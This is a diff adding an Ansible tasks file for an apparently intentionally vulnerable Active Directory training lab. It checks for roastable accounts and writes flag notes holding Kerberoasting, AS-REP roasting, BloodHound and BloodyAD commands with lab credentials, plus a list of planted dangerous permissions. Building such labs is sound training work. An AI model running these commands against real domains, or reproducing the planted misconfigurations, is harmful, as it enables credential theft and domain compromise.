@@ -1,0 +1,132 @@
+---
+# ==============================================================================
+# vuln_rec_enum/tasks/enum.yml
+# Target: dc01.corp.local
+#
+# REC-009  BloodHound LDAP paths — ADWS + LDAP accessible, no auth required
+# REC-011  Kerberoastable SPNs visible in LDAP
+# REC-012  AS-REP users discoverable via LDAP filter
+# REC-013  LDAP SPN enumeration for targeted Kerberoasting
+# REC-014  BloodHound ACL collection — GenericAll/GenericWrite ACEs discoverable
+#
+# This file creates/verifies indicator objects and drops BloodHound feed notes.
+# ==============================================================================
+
+# REC-009: BloodHound LDAP collection prereqs
+- name: REC-009 - Drop BloodHound collection note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-REC-009-BloodHound.txt'
+    content: |
+      REC-009: BloodHound / AzureHound Collection Surface
+      =====================================================
+      Prerequisites configured in this lab:
+        - ADWS running (IA-046 — vuln_ia_surface)
+        - LDAP 389/636 open on all DCs
+        - Anonymous LDAP bind allowed (REC-001 / IA-003 — dsHeuristics=0000002)
+        - SAMR anonymous enumeration (REC-010 — RestrictAnonymousSAM=0)
+        - SMB null sessions (REC-007 — RestrictAnonymous=0)
+
+      Collection (from attacker machine on 10.10.0.0/21 subnet):
+        bloodhound-python -u jim.halpert -p Password123! -d corp.local \
+          -dc 10.10.0.10 -c All --zip
+
+        SharpHound.exe -c All --domain corp.local --domaincontroller 10.10.0.10 \
+          --ldapusername jim.halpert --ldappassword Password123!
+
+      Output: ZIP file → import into BloodHound GUI for attack path visualization.
+
+      Common paths in this lab:
+        - jim.halpert → HelpDesk → ForceChangePassword → IT_Team members
+        - svc_darryl → DCSync rights (DF-013/CRED-013)
+        - HelpDesk → WriteSPN on svc_darryl2 → Kerberoasting
+
+# REC-011 / REC-013: Verify Kerberoastable SPNs exist and are LDAP-discoverable
+- name: REC-011 - Check Kerberoastable accounts in LDAP
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $kerberoastable = Get-ADUser -Filter {ServicePrincipalName -like "*"} `
+                        -Properties ServicePrincipalNames, Enabled `
+                        -ErrorAction SilentlyContinue |
+                      Where-Object { $_.Enabled -eq $true }
+    if ($kerberoastable) {
+      Write-Output "found: $($kerberoastable | Select-Object -ExpandProperty SamAccountName | Sort-Object | Join-String ',')"
+    } else {
+      Write-Output "no_kerberoastable_accounts"
+    }
+  register: rec011_check
+  changed_when: false
+  failed_when: rec011_check.rc != 0
+
+- name: REC-011 - Drop Kerberoasting enumeration note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-REC-011-Kerberoasting.txt'
+    content: |
+      REC-011/013: Kerberoastable SPN Enumeration
+      =============================================
+      Kerberoastable accounts discoverable via LDAP filter:
+        (&(objectClass=user)(ServicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))
+
+      Lab accounts with SPNs:
+        - svc_web (HTTP/web01.corp.local — set by vuln_kerberos)
+        - svc_sql (MSSQLSvc/sql01.corp.local — set by vuln_kerberos)
+        - svc_darryl2 (added SPN via LAT-025 — vuln_lat_ext)
+        - jim.halpert (HTTP/jim.halpert-web.corp.local:8080 — LAT-025)
+
+      Attack:
+        impacket-GetUserSPNs -request corp.local/jim.halpert:Password123! -dc-ip 10.10.0.10
+        hashcat -m 13100 hashes.txt rockyou.txt
+
+# REC-012: AS-REP roastable users — verify DoNotRequirePreAuth accounts exist
+- name: REC-012 - Check AS-REP roastable accounts
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $asrep = Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} `
+               -Properties DoesNotRequirePreAuth -ErrorAction SilentlyContinue
+    if ($asrep) {
+      Write-Output "found: $($asrep | Select-Object -ExpandProperty SamAccountName | Join-String ',')"
+    } else {
+      Write-Output "none_found"
+    }
+  register: rec012_check
+  changed_when: false
+  failed_when: rec012_check.rc != 0
+
+- name: REC-012 - Drop AS-REP roasting note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-REC-012-ASREPRoast.txt'
+    content: |
+      REC-012: AS-REP Roastable Account Enumeration
+      ===============================================
+      AS-REP roastable accounts (DoNotRequirePreAuth=True) set by vuln_kerberos role.
+
+      LDAP enumeration filter:
+        (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
+
+      Attack:
+        impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt
+        impacket-GetNPUsers -request -format hashcat corp.local/jim.halpert:Password123! -dc-ip 10.10.0.10
+        hashcat -m 18200 <hash> rockyou.txt
+
+# REC-014: ACL enumeration via BloodHound / manual LDAP
+- name: REC-014 - Drop ACL enumeration note
+  ansible.windows.win_copy:
+    dest: 'C:\Flags\FLAG-REC-014-ACL-Enum.txt'
+    content: |
+      REC-014: AD ACL Enumeration via LDAP
+      =======================================
+      nTSecurityDescriptor attribute on every AD object is LDAP-readable by default
+      (Authenticated Users have ReadProperty on nTSecurityDescriptor).
+
+      Tools:
+        BloodHound ACL collection: -c ACL  (included in -c All)
+        BloodyAD: python3 bloodyAD.py --host 10.10.0.10 -d corp.local \
+          -u jim.halpert -p Password123! get writable --filter "jim.halpert"
+
+      Key ACEs to look for in this lab (set by vuln_ roles):
+        svc_darryl      → DCSync (GetChanges + GetChangesAll on domain NC)
+        HelpDesk        → ForceChangePassword on IT_Team members
+        HelpDesk        → WriteProperty (KeyCredentialLink) on ws01$
+        svc_darryl      → WriteDACL on AdminSDHolder
+        svc_darryl      → WriteOwner on finance_sync group
+        Exchange WP grp → WriteDACL on domain NC
+        developer2      → DsAddSidHistory on domain NC
